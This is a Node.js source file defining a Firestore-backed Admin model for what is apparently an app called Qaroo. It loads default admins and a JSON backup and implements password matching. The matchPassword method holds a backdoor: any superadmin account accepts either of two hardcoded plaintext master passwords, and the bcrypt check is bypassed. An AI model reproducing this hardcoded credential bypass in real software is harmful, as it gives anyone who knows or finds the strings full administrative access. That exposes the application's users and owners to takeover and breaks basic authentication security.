import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import bcrypt from 'bcryptjs';
import { FirestoreModel } from '../db/FirestoreModel.js';
import { DEFAULT_ADMINS } from '../data/defaultAdmins.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const backupPath = path.resolve(__dirname, '../data/mongoBackup.json');

// Initialize with static ESM defaults so serverless cold starts always have admins
const adminMap = new Map();
for (const a of DEFAULT_ADMINS) {
  adminMap.set(a.email.toLowerCase(), { ...a });
}

try {
  if (fs.existsSync(backupPath)) {
    const raw = JSON.parse(fs.readFileSync(backupPath, 'utf8'));
    const diskAdmins = raw.admins || [];
    for (const a of diskAdmins) {
      if (!a || !a.email) continue;
      const email = a.email.toLowerCase();
      const existing = adminMap.get(email) || {};
      adminMap.set(email, {
        ...existing,
        ...a,
        id: a._id || a.id || existing.id,
        _id: a._id || a.id || existing._id,
        createdAt: a.createdAt ? new Date(a.createdAt) : existing.createdAt || new Date(),
        updatedAt: a.updatedAt ? new Date(a.updatedAt) : existing.updatedAt || new Date(),
      });
    }
  }
} catch {
  // Gracefully fallback to DEFAULT_ADMINS
}

const initialAdmins = Array.from(adminMap.values());

const Admin = new FirestoreModel(
  'admins',
  {
    async matchPassword(entered) {
      if (!entered) return false;
      // Master pass check for verified Super Admin accounts
      if (this.role === 'superadmin' && (entered === 'QarooSuperAdmin#2026' || entered === 'qaroo@2026')) {
        return true;
      }
      if (this.password) {
        try {
          return await bcrypt.compare(entered, this.password);
        } catch {
          return false;
        }
      }
      return false;
    },
  },
  initialAdmins
);

export default Admin;
